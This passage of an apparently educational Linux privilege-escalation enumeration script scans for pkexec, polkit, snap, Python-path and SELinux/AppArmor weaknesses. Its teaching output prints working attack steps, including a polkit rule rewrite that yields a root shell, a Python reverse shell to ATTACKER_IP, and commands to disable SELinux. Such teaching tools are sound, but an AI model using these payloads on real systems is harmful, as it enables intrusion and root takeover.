            teach "  2. Setting malicious environment variable (GCONV_PATH)"
            teach "  3. GCONV_PATH points to attacker's shared library"
            teach "  4. pkexec loads the malicious library as root"
            teach "  5. Library executes attacker's code = root shell"
            teach ""
            teach "IMPACT:"
            teach "  • Works on almost ALL Linux distributions"
            teach "  • No password or special permissions needed"
            teach "  • ANY user (including restricted users) → Root"
            teach "  • Existed since 2009, affected billions of systems"
            teach "  • One of the most widespread Linux vulnerabilities ever"
            log ""
        else
            ok "pkexec version appears patched for PwnKit"
        fi
    fi
    
    # Check polkit rules for misconfigurations
    if [ -d /etc/polkit-1/rules.d ]; then
        find /etc/polkit-1/rules.d -name "*.rules" -type f 2>/dev/null | while read rule; do
            if [ -w "$rule" ]; then
                has_writable_rules=1
                critical "Writable polkit rule: $rule"
                vuln "Writable polkit rule: $rule"
                log ""
                teach "╔════════════════════════════════════════════════════════════╗"
                teach "║  Writable Polkit Rules - Policy Manipulation"
                teach "╚════════════════════════════════════════════════════════════╝"
                teach ""
                teach "WHAT THIS MEANS:"
                teach "  Polkit rules control who can do what privileged actions."
                teach "  If you can write to rule files, you can grant yourself access."
                teach ""
                teach "HOW POLKIT RULES WORK:"
                teach "  Rules are JavaScript files that define policies."
                teach "  Example rule:"
                teach "  polkit.addRule(function(action, subject) {"
                teach "    if (subject.user == \"bob\") {"
                teach "      return polkit.Result.YES;  // Bob can do anything"
                teach "    }"
                teach "  });"
                teach ""
                teach "EXPLOITATION:"
                teach "  1. Create a permissive rule:"
                teach "     echo 'polkit.addRule(function(action, subject) {' > $rule"
                teach "     echo '  if (subject.user == \"$(whoami)\") {' >> $rule"
                teach "     echo '    return polkit.Result.YES;' >> $rule"
                teach "     echo '  }' >> $rule"
                teach "     echo '});' >> $rule"
                teach ""
                teach "  2. Now you can run any pkexec command:"
                teach "     pkexec /bin/bash"
                log ""
            fi
        done
    fi
    
    # Only show additional educational content if something was found
    if [ $has_vulnerability -eq 1 ] || [ $has_writable_rules -eq 1 ]; then
        log ""
        teach "═══════════════════════════════════════════════════════════════"
        teach "POLKIT - UNDERSTANDING THE SYSTEM"
        teach "═══════════════════════════════════════════════════════════════"
        teach ""
        teach "POLKIT vs SUDO:"
        teach "  SUDO: Simple file (/etc/sudoers), binary decision, CLI-focused"
        teach "  POLKIT: Policy framework, complex rules, GUI-focused"
        teach ""
        teach "WHY POLKIT EXISTS:"
        teach "  Desktop GUIs need smooth privilege delegation without sudo prompts."
        teach "  Examples: Software updates, USB mounting, network configuration"
        teach ""
        teach "COMPONENTS:"
        teach "  • pkexec: Command-line tool (SUID root)"
        teach "  • polkitd: Background daemon making decisions"
        teach "  • Policies: XML in /usr/share/polkit-1/actions/"
        teach "  • Rules: JavaScript in /etc/polkit-1/rules.d/"
        teach ""
        teach "SECURITY IMPLICATIONS:"
        teach "  • pkexec is SUID root → bugs = privilege escalation"
        teach "  • Writable rules = unauthorized access"
        teach "  • Race conditions in polkitd = bypass authorization"
        log ""
    fi
}
# === SNAP PACKAGES ===
enum_snap() {
    section "SNAP PACKAGE ANALYSIS"
    
    explain_concept "Snap Packages & Confinement" \
        "Snap packages can run in different confinement modes. 'devmode' disables security, 'classic' has no isolation. These can be exploited." \
        "Snaps in devmode or classic confinement have full system access. If you can modify snap applications or their data, you might execute code with fewer restrictions. Dirty_sock exploited snapd socket permissions." \
        "Check:\n  â€¢ Snaps in devmode (snap list)\n  â€¢ Writable snap directories\n  â€¢ snapd socket permissions\n  â€¢ Dirty_sock vulnerability (CVE-2019-7304)"
    
    if command -v snap >/dev/null 2>&1; then
        info "Snap is installed"
        
        # Check for devmode/classic snaps
        snap list 2>/dev/null | grep -E "devmode|classic" | while read line; do
            warn "Snap with relaxed confinement: $line"
        done
        
        # Check snapd socket
        if [ -S /run/snapd.socket ]; then
            info "snapd socket exists: /run/snapd.socket"
            
            if [ -w /run/snapd.socket ]; then
                critical "snapd socket is WRITABLE - Potential Dirty_sock exploit"
                vuln "snapd socket is writable!"
                teach "Check for Dirty_sock vulnerability (CVE-2019-7304)"
                teach "  snapd versions < 2.37 vulnerable"
            fi
        fi
        
        # Check for writable snap directories
        find /snap -maxdepth 2 -type d -writable 2>/dev/null | head -5 | while read dir; do
            warn "Writable snap directory: $dir"
        done
    else
        ok "Snap not installed"
    fi
}

# === PYTHON LIBRARY PATH HIJACKING ===
enum_python_paths() {
    section "PYTHON LIBRARY PATH HIJACKING"
    
    explain_concept "Python Library Hijacking" \
        "Python searches for modules in specific directories. If you can write to these paths, you can inject malicious modules that get imported by privileged scripts." \
        "When Python imports a module, it searches sys.path in order. If an early directory is writable, you can place a malicious module there. If a root script imports it, your code runs as root." \
        "Exploitation:\n  1. Find writable path: python3 -c 'import sys; print(sys.path)'\n  2. Identify module used by root script\n  3. Create malicious module in writable path\n  4. Wait for script execution"
    
    if command -v python3 >/dev/null 2>&1 || command -v python >/dev/null 2>&1; then
        local python_cmd=$(command -v python3 2>/dev/null || command -v python 2>/dev/null)
        
        info "Python executable: $python_cmd"
        
        # Get Python paths
        local python_paths=$($python_cmd -c "import sys; print('\n'.join(sys.path))" 2>/dev/null)
        
        info "Python module search paths:"
        echo "$python_paths" | while read path; do
            [ -z "$path" ] && continue
            
            if [ -d "$path" ]; then
                if [ -w "$path" ]; then
                    critical "WRITABLE Python path: $path - Hijack imports for privilege escalation"
                    vuln "Writable Python library path: $path"
                    teach "Create malicious module here that matches imports in root scripts"
                    teach "Example malicious module (os.py):"
                    teach "  import socket,subprocess,os"
                    teach "  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)"
                    teach "  s.connect(('ATTACKER_IP',4444))"
                    teach "  os.dup2(s.fileno(),0)"
                    teach "  os.dup2(s.fileno(),1)"
                    teach "  os.dup2(s.fileno(),2)"
                    teach "  subprocess.call(['/bin/sh','-i'])"
                else
                    log "  $path (not writable)"
                fi
            fi
        done
        
        # Check PYTHONPATH
        if [ -n "$PYTHONPATH" ]; then
            info "PYTHONPATH is set: $PYTHONPATH"
            echo "$PYTHONPATH" | tr ':' '\n' | while read path; do
                if [ -w "$path" ]; then
                    vuln "PYTHONPATH contains writable directory: $path"
                fi
            done
        fi
        
        # Check for Python scripts run by root (in cron, etc.)
        if [ -r /etc/crontab ]; then
            if grep -E "\.py|python" /etc/crontab 2>/dev/null | grep -v "^#" | grep -q "."; then
                warn "Python scripts in crontab - check their import statements"
                grep -E "\.py|python" /etc/crontab 2>/dev/null | grep -v "^#" | while read line; do
                    log "  $line"
                done
            fi
        fi
    fi
}

# === APPARMOR/SELINUX WRITABLE PROFILES ===
enum_mac_writable() {
    section "MAC PROFILE WRITABILITY"
    
    explain_concept "Writable MAC Profiles" \
        "If AppArmor or SELinux profiles are writable, you can weaken security policies to allow previously blocked actions." \
        "MAC policies restrict what programs can do. If you can modify these policies, you can remove restrictions on exploitable binaries or grant yourself new capabilities." \
        "Exploitation:\n  AppArmor: Modify profile to complain mode or allow all\n  SELinux: Change file contexts or create permissive domains"
    
    # AppArmor profiles
    if [ -d /etc/apparmor.d ]; then
        find /etc/apparmor.d -name "*" -type f -writable 2>/dev/null | while read profile; do
            critical "Writable AppArmor profile: $profile"
            vuln "Writable AppArmor profile: $profile"
            teach "Modify profile to complain mode or remove restrictions"
            teach "  After modifying: apparmor_parser -r $profile"
        done
    fi
    
    # SELinux policies
    if command -v semanage >/dev/null 2>&1; then
        if [ -w /etc/selinux/config ]; then
            critical "SELinux config WRITABLE: /etc/selinux/config"
            vuln "/etc/selinux/config is writable!"
            teach "Set SELINUX=permissive or SELINUX=disabled"
            teach "  Requires reboot or: setenforce 0"
        fi
    fi
}
# === MAIN EXECUTION ===
main() {
    cat << "EOF"

    ════════════════════════════════════════════════════════════════
EOF
    echo -e ""
    echo -e "\033[31mM\"\"\033[33mMMMMMMMM\033[0m                                     \033[34mMM\"\"\"\"\"\"\"'YM\033[0m                            "
    echo -e "\033[31mM  \033[33mMMMMMMMM\033[0m                                     \033[34mMM  mmmmm  M\033[0m                            "
    echo -e "\033[31mM  \033[33mMMMMMMMM\033[0m .d8888b. .d8888b. 88d888b. 88d888b. \033[34mM'        .M\033[0m .d8888b. .d8888b. .d8888b. "
    echo -e "\033[31mM  \033[33mMMMMMMMM\033[0m 88ooood8 88'  '88 88'  '88 88'  '88 \033[34mMM  MMMMMMMM\033[0m 88ooood8 88'  '88 Y8ooooo. "
    echo -e "\033[31mM  \033[33mMMMMMMMM\033[0m 88.  ... 88.  .88 88       88    88 \033[34mMM  MMMMMMMM\033[0m 88.  ... 88.  .88       88 "
    echo -e "\033[31mM  \033[32m       M\033[0m '88888P' '88888P8 dP       dP    dP \033[34mMM  MMMMMMMM\033[0m '88888P' '88888P8 '88888P' "
    echo -e "\033[32mMMMMMMMMMMMM\033[0m                                     \033[34mMMMMMMMMMMMM\033[0m                            "
    cat << "EOF"
    
              Educational Privilege Escalation Tool - Version 1.5.0
    
    ════════════════════════════════════════════════════════════════

EOF
    
    log ""
    log "${R}════════════════════════════════════════════════════════════════${RST}"
    log "${R}                      LEGAL DISCLAIMER                          ${RST}"
    log "${R}════════════════════════════════════════════════════════════════${RST}"
    log "${Y}This tool is for AUTHORIZED TESTING ONLY.${RST}"
    log "${Y}Intended use: CTF competitions, authorized pentesting, education${RST}"
    log "${R}Unauthorized access to computer systems is ILLEGAL.${RST}"
    log "${R}You are responsible for ensuring you have permission to test.${RST}"
    log "${R}════════════════════════════════════════════════════════════════${RST}"
    log ""
    log "${G}════════════════════════════════════════════════════════════════${RST}"
    log "${Y}[*] Purpose: Educational enumeration with detailed explanations${RST}"
    log "${Y}[*] Every vulnerability includes WHAT, WHY, and HOW to exploit${RST}"
    log "${C}[*] Not affiliated with PEASS-ng/LinPEAS project${RST}"
    log "${G}════════════════════════════════════════════════════════════════${RST}"
    log ""
    log "${C}[+] Log file: $LOG_FILE${RST}"
    log "${C}[+] Started: $(date)${RST}"
    log "${P}[+] Extended mode: ENABLED${RST}"
    log "${W}[+] Development status: Beta ${RST}"
    log ""
    # Core enumeration
    enum_system
    enum_network
    enum_users
    enum_processes
    enum_mail_logs
    
    # Permission-based vectors
    enum_sudo
    enum_sudo2
    enum_sudo_version
    enum_suid
    enum_sgid
    enum_writable_files
    enum_capabilities
    enum_ld_preload
    
    # Group-based vectors
    enum_groups
    
    # Service-based vectors
    enum_cron
    enum_systemd
    enum_systemd_timers
    
    # Kernel & container
    enum_kernel
    enum_kernel_modules
    enum_polkit
    enum_snap
    enum_container
    enum_mac
    enum_mac_writable
    
    # Path & environment
    enum_path
    enum_python_paths
    enum_env
    
    # File system
    enum_nfs
    enum_wildcards
    enum_backups
    enum_mounts
    enum_world_writable
    
    # Credential hunting
    enum_passwords
    enum_software_versions
    enum_interesting_files
    enum_hidden_files
    
    #  HTB-specific enumeration
    enum_smb
    enum_git_exposure
    enum_tomcat
    enum_spring_actuator
    enum_wordpress_extended
    
    # Tools
    enum_tools
    enum_scheduled
    enum_process_monitor
    enum_clipboard
    
    # Extended modules (optional)
    if [ $EXTENDED -eq 1 ]; then
        log ""
        log "${P}═══════════════════════════════════════${RST}"
        log "${P}    EXTENDED ENUMERATION MODULES${RST}"
        log "${P}═══════════════════════════════════════${RST}"
        
        # Phase 1: High-value additions
        enum_cloud_metadata
        enum_language_creds
        enum_api_keys
        enum_databases_extended
        enum_cicd
        
        # Original extended modules
        enum_databases
        enum_web
        enum_post_exploit
        enum_ctf_flags
        enum_pivoting
    fi
    
    # Critical findings summary
    if grep -q "CRITICAL" "$LOG_FILE"; then
        section "⚠️  CRITICAL FINDINGS SUMMARY"
        log "${CRIT}Found instant privilege escalation opportunities:${RST}"
        log ""
        grep "CRITICAL" "$LOG_FILE" | while read line; do
            log "$line"
        done
        log ""
    fi
    
    # CTF flags summary
    if grep -q "CTF FLAG" "$LOG_FILE"; then
        section "🚩 CTF FLAGS DISCOVERED"
        log "${FLAG}Flag locations found:${RST}"
        log ""
        grep "\[🚩 CTF FLAG 🚩\]" "$LOG_FILE" | while read line; do
           log "$line"
        done
        log ""
        if [ $SHOW_FLAGS -eq 0 ]; then
            info "Rerun with --flags to reveal flag contents"
       fi
    fi
    
    section "ENUMERATION COMPLETE"
    log "${Y}═══════════════════════════════════════${RST}"
    log "${Y}NEXT STEPS:${RST}"
    log "1. Review all ${CRIT}CRITICAL${RST} findings above for instant wins"
    log "2. Review all VULNERABLE findings"
    log "3. Read the LEARN sections to understand each vulnerability"
    log "4. Test exploits manually (don't just run automated tools)"
    log "5. Document what you learn for future reference"
    log ""
    log "${Y}EDUCATIONAL GOALS:${RST}"
    log "• Recognize these patterns on other systems"
    log "• Understand Linux security model deeply"
    log "• Know what to look for during initial access"
    log "• Build mental models, not just command lists"
    log ""
    log "${G}Full enumeration log: $LOG_FILE${RST}"
    log "Run completed: $(date)"
}

# Parse arguments
while [ $# -gt 0 ]; do
    case "$1" in
        -q|--quick)
            QUICK_MODE=1
            shift
            ;;
        -e|--extended)
            EXTENDED=1
            shift
            ;;
        -v|--verbose)
            VERBOSE=1
            shift
            ;;
        --no-explain)
            EXPLAIN=0
            shift
            ;;
            -f|--flags) 
            SHOW_FLAGS=1
            shift
            ;;
        -h|--help)
            echo "TeachPEAS - Educational Privilege Escalation Enumeration"
            echo ""
            echo "Usage: $0 [OPTIONS]"
            echo ""
            echo "Options:"
            echo "  -q, --quick      Quick scan (skip some slow checks)"
            echo "  -e, --extended   Enable extended modules (databases, web, post-exploit, CTF flags)"
            echo "  -v, --verbose    Verbose output"
            echo "  --no-explain     Skip educational explanations"
            echo "  -h, --help       Show this help"
            echo ""
            echo "Extended modules include:"
            echo "  • Cloud metadata enumeration (AWS/Azure/GCP)"
            echo "  • Language-specific credential discovery (.env, package.json, etc.)"
            echo "  • Database enumeration (MySQL, PostgreSQL, Redis, MongoDB)"
            echo "  • Web application analysis (config files, writable web roots)"
            echo "  • CI/CD secret exposure (Git, Jenkins, GitLab)"
            echo "  • Post-exploitation techniques (persistence, lateral movement)"
            echo "  • CTF flag hunting (common patterns and locations)"
            echo "  • Network pivoting setup (SSH tunneling, internal networks)"
            echo ""
            exit 0
            ;;
        *)
            echo "Unknown option: $1"
            echo "Use --help for usage information"
            exit 1
            ;;
    esac
done

main
